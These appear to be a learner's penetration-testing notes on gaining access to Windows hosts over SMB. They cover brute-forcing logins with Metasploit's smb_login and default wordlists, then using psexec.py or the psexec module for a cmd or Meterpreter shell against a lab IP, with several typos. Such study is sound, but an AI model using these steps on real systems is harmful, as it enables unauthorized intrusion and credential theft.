SMB with PsExec
#### SMB
- a network file sharing protocol that is used to facilitate the sharing files and peripherals between computer and networks
- port 445.However smb ranot top of NetBIOS using port 139
- SAMBA is the open source linux implementation of SMB,and allows Windows systems to access Linux shares and devices
- smb uses two level of authentication namely user authentication and share authentication
#### PsExec
- PsExec is a lightweight telnet-replacecement developed by Microsoft that allows you execute processes on remote windows systems using any user's credentials
- PsExec authentication is performed via SMB
- We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt
- It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
  
#### Process of SMB Exploitation with PsExec
- In oder to utilize PxExec to again access to a windows target,we will need to identify legitimate user accounts and their respective passwords or passwords hashes
- This can be done various tools,however most common technique will involve performing an SMB logging brute force attack
- We can narrow down our brute force attack to only common windows user  accounts like: Administrator
- then we can authenticate with the target using credentials via PsExec and execute arbitrary commands


#### Exploit
- nmap -sV -sC 10.2.24.221 [ confirm smb is running]
- service postresql start
- msfconsole
- search smb_login
- set all parameters requires [this will retrive users and password]
- psexec.py Adminitrator@10.2.24.221 cmd.exe [ here we need cmd shell that's why we use cmd.exe]
- this will give us cmd prompt
#### msf module
- search psexec
- use  exploit/windows/smb/psexec  
- set password,user,rhost and everything necessary
- run
- this will give us meterpreter shell
- sysinfo [ to get system info]
- getuid [ getting uid]
- shell [ getting a shell]


#### wordlists
- user=/usr/share/metasploit-framework/data/wordlists/common_users.txt
- pass=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

